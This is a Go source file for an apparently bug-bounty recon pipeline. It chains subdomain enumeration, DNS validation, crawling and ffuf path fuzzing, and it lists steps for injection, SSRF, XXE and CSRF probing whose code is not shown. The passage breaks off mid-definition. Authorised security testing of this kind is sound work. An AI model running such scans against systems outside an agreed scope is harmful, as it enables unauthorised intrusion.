package app

import (
	"bufio"
	"context"
	"encoding/csv"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rojo/hack/web_bounty_flow/pkg/config"
	"github.com/rojo/hack/web_bounty_flow/pkg/configstore"
	"github.com/rojo/hack/web_bounty_flow/pkg/dorking"
)

// StepStatus tracks a flow step state.
type StepStatus string

const (
	StepPending StepStatus = "pending"
	StepRunning StepStatus = "running"
	StepDone    StepStatus = "done"
	StepSkipped StepStatus = "skipped"
	StepError   StepStatus = "error"
)

// Step describes a flow stage for UI progress.
type Step struct {
	ID    string `json:"id"`
	Label string `json:"label"`
}

const (
	StepLoadConfig     = "load-config"
	StepValidateInputs = "validate-inputs"
	StepAmass          = "amass"
	StepSublist3r      = "sublist3r"
	StepAssetfinder    = "assetfinder"
	StepGAU            = "gau"
	StepCTL            = "ctl"
	StepSubfinder      = "subfinder"
	StepDNSX           = "dnsx-validate"
	StepRobotsSitemaps = "robots-sitemaps"
	StepWaybackURLs    = "waybackurls"
	StepKatana         = "katana"
	StepURLCorpus      = "url-corpus"
	StepParamFuzz      = "param-fuzz"
	StepInjectionCheck = "injection-checks"
	StepServerInputChk = "server-input-checks"
	StepAdvInjection   = "adv-injection-checks"
	StepCSRFChecks     = "csrf-checks"
	StepDorkLinks      = "dork-links"
	StepConsolidate    = "consolidate"
	StepHTTPX          = "httpx"
	StepCeWL           = "cewl"
	StepFuzzDocs       = "fuzz-docs"
	StepFuzzDirs       = "fuzz-dirs"
	StepGithubDork     = "github-dork"
)

var flowSteps = []Step{
	{ID: StepLoadConfig, Label: "Load flow.yaml and initialize recon runtime."},
	{ID: StepValidateInputs, Label: "Validate scope readiness (at least one non-empty input list is required)."},
	{ID: StepAmass, Label: "Run amass enum for each wildcard."},
	{ID: StepSublist3r, Label: "Run sublist3r in parallel with other passive tools."},
	{ID: StepAssetfinder, Label: "Run assetfinder in parallel with other passive tools."},
	{ID: StepGAU, Label: "Run gau in parallel with other passive tools."},
	{ID: StepCTL, Label: "Query certificate transparency logs in parallel."},
	{ID: StepSubfinder, Label: "Run subfinder in parallel with other passive tools."},
	{ID: StepDNSX, Label: "Validate discovered hosts with dnsx before consolidation."},
	{ID: StepConsolidate, Label: "Consolidate all discovered hosts and remove duplicates."},
	{ID: StepHTTPX, Label: "Probe consolidated hosts with httpx for live web servers."},
	{ID: StepRobotsSitemaps, Label: "Run robots.txt and sitemap discovery in main flow."},
	{ID: StepWaybackURLs, Label: "Integrate waybackurls into active flow."},
	{ID: StepKatana, Label: "Integrate katana crawling into active flow."},
	{ID: StepURLCorpus, Label: "Consolidate URL corpus from all sources."},
	{ID: StepParamFuzz, Label: "Fuzz query/body/header/cookie parameters with baseline diffing."},
	{ID: StepInjectionCheck, Label: "Run baseline-diff SQLi/NoSQL/XPath/LDAP checks."},
	{ID: StepServerInputChk, Label: "Run baseline-diff OS command/path traversal/file inclusion checks."},
	{ID: StepAdvInjection, Label: "Run baseline-diff XXE/SOAP/SSRF/SMTP checks."},
	{ID: StepCSRFChecks, Label: "Run CSRF token/origin/referer validation checks with replay diffs."},
	{ID: StepDorkLinks, Label: "Auto-generate dork links for org/wildcard/domain/api-domain seeds."},
	{ID: StepCeWL, Label: "Generate custom CeWL wordlist from live web servers."},
	{ID: StepFuzzDocs, Label: "Run ffuf documentation endpoint fuzzing and collect hits."},
	{ID: StepFuzzDirs, Label: "Run ffuf directory/API path fuzzing and collect hits."},
}

// FlowSteps returns the ordered flow steps for UI rendering.
func FlowSteps() []Step {
	out := make([]Step, len(flowSteps))
	copy(out, flowSteps)
	return out
}

// App coordinates each stage of the bounty flow.
type App struct {
	cfg         *config.Config
	logger      *log.Logger
	httpClient  *http.Client
	liveCSVPath string
	logWriter   io.Writer
	stepUpdate  func(id string, status StepStatus)
	configStore *configstore.Store
}

type liveWebserverRecord struct {
	URL           string
	StatusCode    int
	Title         string
	WebServer     string
	Technologies  []string
	ContentLength int
}

const (
	defaultRetryAttempts = 2
	defaultRetryBackoff  = 2 * time.Second
	ctlRetryAttempts     = 3
	ctlRetryBackoff      = 2 * time.Second
)

// New creates an orchestrator with the provided configuration.
func New(cfg *config.Config, logger *log.Logger, logWriter io.Writer, stepUpdate func(id string, status StepStatus), configStore *configstore.Store) *App {
	return &App{
		cfg:         cfg,
		logger:      logger,
		httpClient:  &http.Client{},
		logWriter:   logWriter,
		stepUpdate:  stepUpdate,
		configStore: configStore,
	}
}

// Run executes the recon flow.
func (a *App) Run(ctx context.Context) error {
	a.updateStep(StepLoadConfig, StepRunning)
	a.updateStep(StepLoadConfig, StepDone)

	a.logger.Println("preparing directories")
	if err := a.prepareDirectories(); err != nil {
		return err
	}
	if err := a.normalizeLegacyListFiles(); err != nil {
		return err
	}

	if err := a.runStep(StepValidateInputs, func() error {
		return a.validateReconInputs()
	}); err != nil {
		return err
	}

	a.logger.Println("running wildcard recon pipeline")
	if err := a.passiveRecon(ctx); err != nil {
		return err
	}

	return nil
}

// RunGithubDorking triggers the GitHub dorking step without running the full flow.
func (a *App) RunGithubDorking(ctx context.Context) error {
	return a.githubDorking(ctx)
}

func (a *App) updateStep(id string, status StepStatus) {
	if a.stepUpdate == nil {
		return
	}
	a.stepUpdate(id, status)
}

func (a *App) runStep(id string, fn func() error) error {
	a.updateStep(id, StepRunning)
	if err := fn(); err != nil {
		a.updateStep(id, StepError)
		return err
	}
	a.updateStep(id, StepDone)
	return nil
}

func (a *App) skipStep(id string) {
	a.updateStep(id, StepSkipped)
}

func (a *App) githubDorking(ctx context.Context) error {
	if a.configStore == nil {
		a.skipStep(StepGithubDork)
		return nil
	}

	cfg, err := a.configStore.LoadDecrypted()
	if err != nil {
		return err
	}

	gh := cfg.Providers["github"]
	if gh == nil || !gh.AutoRun {
		a.skipStep(StepGithubDork)
		return nil
	}

	activeKeys := gh.ActiveTokens()
	if len(activeKeys) == 0 {
		a.skipStep(StepGithubDork)
		return nil
	}

	var tokens []dorking.Token
	for _, key := range activeKeys {
		tokens = append(tokens, dorking.Token{ID: key.ID, Value: key.Value})
	}

	outputDir := filepath.Join(a.cfg.Paths.DorkingDir, "github")
	if err := os.MkdirAll(outputDir, 0o755); err != nil {
		return err
	}

	opts := dorking.GithubOptions{
		OutputDir: outputDir,
		Tokens:    tokens,
		Logger:    a.logger,
		UpdateToken: func(tokenID string, used time.Time, lastErr string) {
			_ = a.configStore.UpdateTokenUsage("github", tokenID, used, lastErr)
		},
	}

	return dorking.RunGithubSearch(ctx, opts)
}

func (a *App) prepareDirectories() error {
	ffufBase := a.fuzzingFFUFDir()
	docBase := a.fuzzingDocsDir()
	directories := []string{
		a.cfg.Paths.RobotsDir,
		filepath.Join(a.cfg.Paths.RobotsDir, a.cfg.Paths.RobotsHitsDir),
		filepath.Join(a.cfg.Paths.RobotsDir, a.cfg.Paths.RobotsNoHitsDir),
		a.cfg.Paths.DorkingDir,
		ffufBase,
		filepath.Join(ffufBase, a.cfg.Paths.FuzzingHitsDir),
		filepath.Join(ffufBase, a.cfg.Paths.FuzzingNoHitsDir),
		docBase,
		a.cfg.Paths.LogsDir,
		a.cfg.Paths.NmapDir,
	}

	listFiles := []string{
		a.cfg.Lists.Organizations,
		a.cfg.Lists.IPs,
		a.cfg.Lists.Wildcards,
		a.cfg.Lists.Domains,
		a.cfg.Lists.APIDomains,
		a.cfg.Lists.OutOfScope,
	}

	for _, listPath := range listFiles {
		if listPath == "" {
			continue
		}
		dir := filepath.Dir(listPath)
		if dir == "." || dir == "" {
			continue
		}
		directories = append(directories, dir)
	}

	for _, dir := range directories {
		if dir == "" {
			continue
		}
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return err
		}
	}

	return nil
}

func (a *App) passiveRecon(ctx context.Context) error {
	for _, step := range []string{
		StepAmass, StepSublist3r, StepAssetfinder, StepGAU, StepCTL, StepSubfinder, StepDNSX, StepConsolidate, StepHTTPX, StepRobotsSitemaps, StepWaybackURLs, StepKatana, StepURLCorpus, StepParamFuzz, StepInjectionCheck, StepServerInputChk, StepAdvInjection, StepCSRFChecks, StepDorkLinks, StepCeWL, StepFuzzDocs, StepFuzzDirs,
	} {
		a.updateStep(step, StepPending)
	}

	if !fileExists(a.cfg.Lists.Wildcards) || len(readSafeLines(a.cfg.Lists.Wildcards)) == 0 {
		for _, step := range []string{
			StepAmass, StepSublist3r, StepAssetfinder, StepGAU, StepCTL, StepSubfinder, StepDNSX, StepConsolidate, StepHTTPX, StepRobotsSitemaps, StepWaybackURLs, StepKatana, StepURLCorpus, StepParamFuzz, StepInjectionCheck, StepServerInputChk, StepAdvInjection, StepCSRFChecks, StepDorkLinks, StepCeWL, StepFuzzDocs, StepFuzzDirs,
		} {
			a.skipStep(step)
		}
		return nil
	}

	return a.runSubdomainDiscovery(ctx)
}

func (a *App) validateReconInputs() error {
	scopeInputs := []struct {
		label string
		path  string
	}{
		{label: "organizations", path: a.cfg.Lists.Organizations},
		{label: "wildcards", path: a.cfg.Lists.Wildcards},
		{label: "domains", path: a.cfg.Lists.Domains},
		{label: "apidomains", path: a.cfg.Lists.APIDomains},
		{label: "ips", path: a.cfg.Lists.IPs},
	}

	var available []string

	for _, item := range scopeInputs {
		if fileExists(item.path) && len(readSafeLines(item.path)) > 0 {
			available = append(available, fmt.Sprintf("%s (%s)", item.label, item.path))
		}
	}

	if len(available) == 0 {
		return fmt.Errorf("required recon input files are not ready; provide at least one non-empty scope file: organizations, wildcards, domains, apidomains, or ips")
	}

	a.logger.Printf("scope inputs available: %s", strings.Join(available, ", "))
	return nil
}

func (a *App) normalizeLegacyListFiles() error {
	paths := []string{
		a.cfg.Lists.Organizations,
		a.cfg.Lists.IPs,
		a.cfg.Lists.Wildcards,
		a.cfg.Lists.Domains,
		a.cfg.Lists.APIDomains,
		a.cfg.Lists.OutOfScope,
	}

	for _, path := range paths {
		if path == "" {
			continue
		}
		legacy := path + ".txt"

		switch {
		case !fileExists(path) && fileExists(legacy):
			a.logger.Printf("migrating legacy list file %s -> %s", legacy, path)
			if err := os.Rename(legacy, path); err != nil {
				return err
			}
		case fileExists(path) && fileExists(legacy):
			primary := readSafeLines(path)
			old := readSafeLines(legacy)
			merged := unique(append(primary, old...))
			if err := os.WriteFile(path, []byte(strings.Join(merged, "\n")), 0o644); err != nil {
				return err
			}
			if err := os.Remove(legacy); err != nil {
				return err
			}
			a.logger.Printf("merged legacy list file %s into %s", legacy, path)
		}
	}

	return nil
}

func (a *App) runSubdomainDiscovery(ctx context.Context) error {
	seeds, err := readFileLines(a.cfg.Lists.Wildcards)
	if err != nil {
		return err
	}

	seenSeeds := make(map[string]struct{})
	var normalizedSeeds []string
	for _, seed := range seeds {
		normalized := normalizeSubdomainSeed(seed)
		if normalized == "" {
			continue
		}
		if _, ok := seenSeeds[normalized]; ok {
			continue
		}
		seenSeeds[normalized] = struct{}{}
		normalizedSeeds = append(normalizedSeeds, normalized)
	}
	if len(normalizedSeeds) == 0 {
		return fmt.Errorf("no valid wildcard seeds in %s", a.cfg.Lists.Wildcards)
	}
	a.logger.Printf("subdomain discovery: %d wildcard seed(s): %s", len(normalizedSeeds), strings.Join(normalizedSeeds, ", "))

	reconDir := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "recon")
	amassDir := filepath.Join(reconDir, "amass")
	rawDir := filepath.Join(reconDir, "raw")
	combinedAmassJSON := filepath.Join(amassDir, "amass_enum.jsonl")
	if err := os.MkdirAll(amassDir, 0o755); err != nil {
		return err
	}
	for _, dir := range []string{
		filepath.Join(rawDir, StepAmass),
		filepath.Join(rawDir, StepSublist3r),
		filepath.Join(rawDir, StepAssetfinder),
		filepath.Join(rawDir, StepGAU),
		filepath.Join(rawDir, StepCTL),
		filepath.Join(rawDir, StepSubfinder),
		filepath.Join(rawDir, StepDNSX),
	} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return err
		}
	}
	if err := os.WriteFile(combinedAmassJSON, []byte{}, 0o644); err != nil {
		return err
	}

	toolResults := map[string]map[string]struct{}{
		StepAmass:       {},
		StepSublist3r:   {},
		StepAssetfinder: {},
		StepGAU:         {},
		StepCTL:         {},
		StepSubfinder:   {},
	}
	var resultMu sync.Mutex
	appendResults := func(step string, hosts []string) {
		resultMu.Lock()
		defer resultMu.Unlock()
		for _, host := range hosts {
			host = normalizeDorkTarget(host)
			if host == "" {
				continue
			}
			toolResults[step][host] = struct{}{}
		}
	}

	type toolRunner struct {
		step       string
		required   string
		attempts   int
		backoff    time.Duration
		runForSeed func(ctx context.Context, seed string) ([]string, error)
	}

	var amassFileMu sync.Mutex
	runners := []toolRunner{
		{
			step:     StepAmass,
			required: "amass",
			attempts: defaultRetryAttempts,
			backoff:  defaultRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				seedFile := sanitizeFilename(seed)
				seedPrefix := filepath.Join(amassDir, seedFile)
				seedJSON := seedPrefix + ".json"
				seedText := seedPrefix + ".txt"
				_, err := a.runCommandCapture(ctx, "amass", "enum", "-passive", "-d", seed, "-oA", seedPrefix)
				if err != nil {
					return nil, err
				}
				hosts := parseDomainLines(strings.Join(readSafeLines(seedText), "\n"), seed)
				if copyErr := copyFile(seedText, filepath.Join(rawDir, StepAmass, fmt.Sprintf("%s.txt", seedFile))); copyErr != nil && fileExists(seedText) {
					a.logger.Printf("%s: failed to persist raw output for %s: %v", StepAmass, seed, copyErr)
				}
				if fileExists(seedJSON) {
					rawJSON, readErr := os.ReadFile(seedJSON)
					if readErr != nil {
						return nil, readErr
					}
					if writeErr := os.WriteFile(filepath.Join(rawDir, StepAmass, fmt.Sprintf("%s.json", seedFile)), rawJSON, 0o644); writeErr != nil {
						a.logger.Printf("%s: failed to persist raw json for %s: %v", StepAmass, seed, writeErr)
					}
					jsonLines := toJSONLines(rawJSON)
					if len(jsonLines) == 0 {
						jsonLines = []string{strings.TrimSpace(string(rawJSON))}
					}
					amassFileMu.Lock()
					appendErr := appendToFile(combinedAmassJSON, strings.Join(jsonLines, "\n")+"\n")
					amassFileMu.Unlock()
					if appendErr != nil {
						return nil, appendErr
					}
				}
				return hosts, nil
			},
		},
		{
			step:     StepSublist3r,
			required: "sublist3r",
			attempts: defaultRetryAttempts,
			backoff:  defaultRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				// Sublist3r has unstable parsers for some engines (for example DNSdumpster/VirusTotal),
				// so use a safer engine set and read results from file output.
				outFile := filepath.Join(rawDir, StepSublist3r, fmt.Sprintf("%s.txt", sanitizeFilename(seed)))
				_, err := a.runCommandCapture(
					ctx,
					"sublist3r",
					"-d", seed,
					"-e", "crtsh,netcraft,passivedns",
					"-o", outFile,
				)
				if err != nil {
					return nil, err
				}
				return parseDomainLines(strings.Join(readSafeLines(outFile), "\n"), seed), nil
			},
		},
		{
			step:     StepAssetfinder,
			required: "assetfinder",
			attempts: defaultRetryAttempts,
			backoff:  defaultRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				stdout, err := a.runCommandCapture(ctx, "assetfinder", "--subs-only", seed)
				if err != nil {
					return nil, err
				}
				if writeErr := os.WriteFile(filepath.Join(rawDir, StepAssetfinder, fmt.Sprintf("%s.txt", sanitizeFilename(seed))), []byte(stdout), 0o644); writeErr != nil {
					a.logger.Printf("%s: failed to persist raw output for %s: %v", StepAssetfinder, seed, writeErr)
				}
				return parseDomainLines(stdout, seed), nil
			},
		},
		{
			step:     StepGAU,
			required: "gau",
			attempts: defaultRetryAttempts,
			backoff:  defaultRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				stdout, err := a.runCommandCapture(ctx, "gau", "--subs", seed)
				if err != nil {
					return nil, err
				}
				if writeErr := os.WriteFile(filepath.Join(rawDir, StepGAU, fmt.Sprintf("%s.txt", sanitizeFilename(seed))), []byte(stdout), 0o644); writeErr != nil {
					a.logger.Printf("%s: failed to persist raw output for %s: %v", StepGAU, seed, writeErr)
				}
				return parseHostsFromURLs(stdout, seed), nil
			},
		},
		{
			step:     StepCTL,
			required: "",
			attempts: ctlRetryAttempts,
			backoff:  ctlRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				hosts, raw, err := a.fetchCTLHostsRaw(ctx, seed)
				if err != nil {
					return nil, err
				}
				if writeErr := os.WriteFile(filepath.Join(rawDir, StepCTL, fmt.Sprintf("%s.json", sanitizeFilename(seed))), raw, 0o644); writeErr != nil {
					a.logger.Printf("%s: failed to persist raw output for %s: %v", StepCTL, seed, writeErr)
				}
				return hosts, nil
			},
		},
		{
			step:     StepSubfinder,
			required: "subfinder",
			attempts: defaultRetryAttempts,
			backoff:  defaultRetryBackoff,
			runForSeed: func(ctx context.Context, seed string) ([]string, error) {
				stdout, err := a.runCommandCapture(ctx, "subfinder", "-silent", "-d", seed)
				if err != nil {
					return nil, err
				}
				if writeErr := os.WriteFile(filepath.Join(rawDir, StepSubfinder, fmt.Sprintf("%s.txt", sanitizeFilename(seed))), []byte(stdout), 0o644); writeErr != nil {
					a.logger.Printf("%s: failed to persist raw output for %s: %v", StepSubfinder, seed, writeErr)
				}
				return parseDomainLines(stdout, seed), nil
			},
		},
	}

	available := make(map[string]bool, len(runners))
	for _, runner := range runners {
		if runner.required == "" {
			available[runner.step] = true
			continue
		}
		_, err := exec.LookPath(runner.required)
		available[runner.step] = err == nil
	}

	failedSteps := make(map[string]error)
	var failedMu sync.Mutex
	markFailed := func(step string, err error) {
		failedMu.Lock()
		defer failedMu.Unlock()
		if _, ok := failedSteps[step]; !ok {
			failedSteps[step] = err
		}
	}
	isFailed := func(step string) bool {
		failedMu.Lock()
		defer failedMu.Unlock()
		_, ok := failedSteps[step]
		return ok
	}

	for _, runner := range runners {
		if !available[runner.step] {
			a.skipStep(runner.step)
			a.logger.Printf("%s: skipped (binary not found)", runner.step)
			continue
		}
		a.updateStep(runner.step, StepRunning)
		a.logger.Printf("%s: running", runner.step)
	}

	for _, seed := range normalizedSeeds {
		var wg sync.WaitGroup
		for _, runner := range runners {
			r := runner
			if !available[r.step] || isFailed(r.step) {
				continue
			}
			wg.Add(1)
			go func() {
				defer wg.Done()
				start := time.Now()
				a.logger.Printf("%s: starting seed=%s", r.step, seed)
				hosts, err := a.runForSeedWithRetry(ctx, r.step, seed, r.attempts, r.backoff, func() ([]string, error) {
					return r.runForSeed(ctx, seed)
				})
				if err != nil {
					markFailed(r.step, fmt.Errorf("%s failed for %s: %w", r.step, seed, err))
					a.logger.Printf("%s: error seed=%s: %v", r.step, seed, err)
					return
				}
				appendResults(r.step, hosts)
				a.logger.Printf("%s: finished seed=%s hosts=%d duration=%s", r.step, seed, len(hosts), time.Since(start).Round(time.Second))
			}()
		}
		wg.Wait()
	}

	for _, runner := range runners {
		if !available[runner.step] {
			continue
		}
		if isFailed(runner.step) {
			a.updateStep(runner.step, StepError)
			continue
		}
		a.updateStep(runner.step, StepDone)
	}
	if len(failedSteps) > 0 {
		var failedLabels []string
		for _, runner := range runners {
			if err, ok := failedSteps[runner.step]; ok {
				failedLabels = append(failedLabels, fmt.Sprintf("%s (%v)", runner.step, err))
			}
		}
		a.logger.Printf("subdomain discovery: continuing with partial results; failed tools: %s", strings.Join(failedLabels, "; "))
	}
	for _, runner := range runners {
		a.logger.Printf("%s: total unique hosts=%d", runner.step, len(toolResults[runner.step]))
	}

	mergedSet := make(map[string]struct{})
	for _, results := range toolResults {
		for host := range results {
			mergedSet[host] = struct{}{}
		}
	}
	mergedHosts := make([]string, 0, len(mergedSet))
	for host := range mergedSet {
		mergedHosts = append(mergedHosts, host)
	}
	sort.Strings(mergedHosts)

	validatedHosts := mergedHosts
	if _, err := exec.LookPath("dnsx"); err != nil {
		a.skipStep(StepDNSX)
		a.logger.Printf("%s: skipped (binary not found)", StepDNSX)
	} else {
		if err := a.runStep(StepDNSX, func() error {
			if len(mergedHosts) == 0 {
				a.logger.Printf("%s: no hosts to validate", StepDNSX)
				return nil
			}
			hosts, ips, validateErr := a.validateHostsWithDNSX(ctx, mergedHosts, filepath.Join(rawDir, StepDNSX))
			if validateErr != nil {
				return validateErr
			}
			validatedHosts = hosts
			if len(ips) > 0 {
				if ipErr := a.mergeDiscoveredIPs(ips); ipErr != nil {
					a.logger.Printf("%s: failed to update ips list: %v", StepDNSX, ipErr)
				}
			}
			a.logger.Printf("%s: validated %d/%d host(s)", StepDNSX, len(validatedHosts), len(mergedHosts))
			return nil
		}); err != nil {
			a.logger.Printf("%s: failed, falling back to unvalidated hosts: %v", StepDNSX, err)
			validatedHosts = mergedHosts
		}
	}

	if err := a.runStep(StepConsolidate, func() error {
		tmpFile, err := os.CreateTemp("", "bflow-consolidate-raw-")
		if err != nil {
			return err
		}
		defer os.Remove(tmpFile.Name())
		if _, err := tmpFile.WriteString(strings.Join(validatedHosts, "\n")); err != nil {
			tmpFile.Close()
			return err
		}
		if err := tmpFile.Close(); err != nil {
			return err
		}
		if err := a.runShell(ctx, fmt.Sprintf("cat %s | awk 'NF' | sort -fu > %s", tmpFile.Name(), a.cfg.Lists.Domains)); err != nil {
			return err
		}
		if err := a.generateAPIDomainsFromDomains(); err != nil {
			return err
		}
		a.logger.Printf("consolidate: wrote %d unique domain(s) to %s", len(readSafeLines(a.cfg.Lists.Domains)), a.cfg.Lists.Domains)
		a.logger.Printf("consolidate: wrote %d API-related domain(s) to %s", len(readSafeLines(a.cfg.Lists.APIDomains)), a.cfg.Lists.APIDomains)
		return nil
	}); err != nil {
		return err
	}

	if err := a.runStep(StepHTTPX, func() error {
		_, err := a.buildHTTPDomains(ctx)
		return err
	}); err != nil {
		return err
	}

	if err := a.runStep(StepRobotsSitemaps, func() error {
		return a.robots(ctx, a.httpListOrDefault(a.cfg.Lists.Domains))
	}); err != nil {
		return err
	}

	if _, err := exec.LookPath("waybackurls"); err != nil {
		a.skipStep(StepWaybackURLs)
		a.logger.Printf("%s: skipped (binary not found)", StepWaybackURLs)
	} else if err := a.runStep(StepWaybackURLs, func() error {
		return a.runWaybackURLs(ctx, a.httpListOrDefault(a.cfg.Lists.Domains))
	}); err != nil {
		return err
	}

	if _, err := exec.LookPath("katana"); err != nil {
		a.skipStep(StepKatana)
		a.logger.Printf("%s: skipped (binary not found)", StepKatana)
	} else if err := a.runStep(StepKatana, func() error {
		return a.runKatana(ctx, a.httpListOrDefault(a.cfg.Lists.Domains))
	}); err != nil {
		return err
	}

	if err := a.runStep(StepURLCorpus, func() error {
		return a.consolidateURLCorpus()
	}); err != nil {
		return err
	}

	if err := a.runStep(StepParamFuzz, func() error {
		return a.runParamFuzz(ctx)
	}); err != nil {
		return err
	}

	if err := a.runStep(StepInjectionCheck, func() error {
		return a.runInjectionChecks(ctx)
	}); err != nil {
		return err
	}

	if err := a.runStep(StepServerInputChk, func() error {
		return a.runServerInputChecks(ctx)
	}); err != nil {
		return err
	}

	if err := a.runStep(StepAdvInjection, func() error {
		return a.runAdvancedInjectionChecks(ctx)
	}); err != nil {
		return err
	}

	if err := a.runStep(StepCSRFChecks, func() error {
		return a.runCSRFChecks(ctx)
	}); err != nil {
		return err
	}

	if _, err := exec.LookPath("generate_dork_links"); err != nil {
		a.skipStep(StepDorkLinks)
		a.logger.Printf("%s: skipped (generate_dork_links not found)", StepDorkLinks)
	} else if err := a.runStep(StepDorkLinks, func() error {
		return a.generateDorkLinksIfNeeded(ctx)
	}); err != nil {
		return err
	}

	if _, err := exec.LookPath("cewl"); err != nil {
		a.skipStep(StepCeWL)
	} else if err := a.runStep(StepCeWL, func() error {
		targets := readSafeLines(a.httpListOrDefault(a.cfg.Lists.Domains))
		if len(targets) == 0 {
			return nil
		}

		reconDir := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "recon")
		if err := os.MkdirAll(reconDir, 0o755); err != nil {
			return err
		}

		wordSet := make(map[string]struct{})
		for _, target := range targets {
			stdout, err := a.runCommandCapture(ctx, "cewl", "-q", "-d", "2", "-m", "4", target)
			if err != nil {
				a.logger.Printf("cewl failed for %s: %v", target, err)
				continue
			}
			for _, word := range strings.Split(stdout, "\n") {
				word = strings.TrimSpace(word)
				if word == "" {
					continue
				}
				wordSet[word] = struct{}{}
			}
		}

		words := make([]string, 0, len(wordSet))
		for word := range wordSet {
			words = append(words, word)
		}
		sort.Strings(words)
		out := filepath.Join(reconDir, "cewl_custom_wordlist.txt")
		return os.WriteFile(out, []byte(strings.Join(words, "\n")), 0o644)
	}); err != nil {
		return err
	}

	if err := a.runFuzzDocumentation(ctx); err != nil {
		return err
	}
	return a.runFuzzDirectories(ctx)
}

func (a *App) runFuzzDocumentation(ctx context.Context) error {
	if _, err := exec.LookPath("ffuf"); err != nil {
		a.skipStep(StepFuzzDocs)
		a.logger.Printf("%s: skipped (ffuf not found)", StepFuzzDocs)
		return nil
	}
	if !fileExists(a.cfg.Wordlists.APIDocs) {
		a.skipStep(StepFuzzDocs)
		a.logger.Printf("%s: skipped (apidocs wordlist missing: %s)", StepFuzzDocs, a.cfg.Wordlists.APIDocs)
		return nil
	}

	return a.runStep(StepFuzzDocs, func() error {
		targets := unique(append(readSafeLines(a.cfg.Lists.APIDomains), readSafeLines(a.cfg.Lists.Wildcards)...))
		urlTargets := normalizeHTTPSTargets(targets)
		if len(urlTargets) == 0 {
			a.logger.Printf("%s: no targets available", StepFuzzDocs)
			return nil
		}

		docsDir := a.fuzzingDocsDir()
		if err := os.MkdirAll(docsDir, 0o755); err != nil {
			return err
		}
		hitsFile := filepath.Join(docsDir, "doc_hits.txt")
		if err := os.WriteFile(hitsFile, []byte{}, 0o644); err != nil {
			return err
		}

		totalHits := 0
		for _, target := range urlTargets {
			outFile := filepath.Join(docsDir, fmt.Sprintf("%s.csv", sanitizeFilename(target)))
			a.logger.Printf("%s: ffuf target=%s", StepFuzzDocs, target)
			_, err := a.runCommandCapture(
				ctx,
				"ffuf",
				"-u", strings.TrimRight(target, "/")+"/FUZZ",
				"-w", a.cfg.Wordlists.APIDocs,
				"-mc", "200,301",
				"-of", "csv",
				"-o", outFile,
			)
			if err != nil {
				a.logger.Printf("%s: ffuf failed for %s: %v", StepFuzzDocs, target, err)
				continue
			}
			hits, parseErr := extractFFUFHitURLs(outFile)
			if parseErr != nil {
				a.logger.Printf("%s: failed to parse %s: %v", StepFuzzDocs, outFile, parseErr)
				continue
			}
			if len(hits) > 0 {
				totalHits += len(hits)
				if err := appendToFile(hitsFile, strings.Join(hits, "\n")+"\n"); err != nil {
					return err
				}
			}
		}
		a.logger.Printf("%s: total hits=%d (%s)", StepFuzzDocs, totalHits, hitsFile)
		return dedupeAndSortFile(hitsFile)
	})
}

func (a *App) runFuzzDirectories(ctx context.Context) error {
	if _, err := exec.LookPath("ffuf"); err != nil {
		a.skipStep(StepFuzzDirs)
		a.logger.Printf("%s: skipped (ffuf not found)", StepFuzzDirs)
		return nil
	}
	missing := missingFiles(a.cfg.Wordlists.APIWild501, a.cfg.Wordlists.SecListAPILongest, a.cfg.Wordlists.CustomProjectSpecific)
	if len(missing) > 0 {
		a.skipStep(StepFuzzDirs)
		a.logger.Printf("%s: skipped (wordlist missing: %s)", StepFuzzDirs, strings.Join(missing, ", "))
		return nil
	}

	return a.runStep(StepFuzzDirs, func() error {
		targets := unique(append(readSafeLines(a.cfg.Lists.APIDomains), readSafeLines(a.cfg.Lists.Wildcards)...))
		urlTargets := normalizeHTTPSTargets(targets)
		if len(urlTargets) == 0 {
			a.logger.Printf("%s: no targets available", StepFuzzDirs)
			return nil
		}

		ffufDir := a.fuzzingFFUFDir()
		hitsDir := filepath.Join(ffufDir, a.cfg.Paths.FuzzingHitsDir)
		noHitsDir := filepath.Join(ffufDir, a.cfg.Paths.FuzzingNoHitsDir)
		if err := os.MkdirAll(hitsDir, 0o755); err != nil {
			return err
		}
		if err := os.MkdirAll(noHitsDir, 0o755); err != nil {
			return err
		}

		fuzzList := filepath.Join(ffufDir, "fuzzme.txt")
		hitsFile := filepath.Join(ffufDir, "dir_hits.txt")
		if err := combineWordlists(fuzzList, a.cfg.Wordlists.APIWild501, a.cfg.Wordlists.SecListAPILongest, a.cfg.Wordlists.CustomProjectSpecific); err != nil {
			return err
		}
		if err := os.WriteFile(hitsFile, []byte{}, 0o644); err != nil {
			return err
		}

		totalHits := 0
		for _, target := range urlTargets {
			clean := sanitizeFilename(target)
			outFile := filepath.Join(ffufDir, fmt.Sprintf("%s.csv", clean))
			a.logger.Printf("%s: ffuf target=%s", StepFuzzDirs, target)
			_, err := a.runCommandCapture(
				ctx,
				"ffuf",
				"-u", strings.TrimRight(target, "/")+"/FUZZ",
				"-w", fuzzList,
				"-mc", "200,301",
				"-of", "csv",
				"-o", outFile,
			)
			if err != nil {
				a.logger.Printf("%s: ffuf failed for %s: %v", StepFuzzDirs, target, err)
				continue
			}
			hits, parseErr := extractFFUFHitURLs(outFile)
			if parseErr != nil {
				a.logger.Printf("%s: failed to parse %s: %v", StepFuzzDirs, outFile, parseErr)
				continue
			}
			if len(hits) == 0 {
				_ = moveIfExists(outFile, filepath.Join(noHitsDir, filepath.Base(outFile)))
				continue
			}
			totalHits += len(hits)
			if err := appendToFile(hitsFile, strings.Join(hits, "\n")+"\n"); err != nil {
				return err
			}
			_ = moveIfExists(outFile, filepath.Join(hitsDir, filepath.Base(outFile)))
		}
		a.logger.Printf("%s: total hits=%d (%s)", StepFuzzDirs, totalHits, hitsFile)
		return dedupeAndSortFile(hitsFile)
	})
}

type paramFuzzObservation struct {
	StatusCode  int
	Length      int
	DurationMS  int64
	Location    string
	Snippet     string
	Cookies     []string
	TokenHeader string
}

type paramFuzzHit struct {
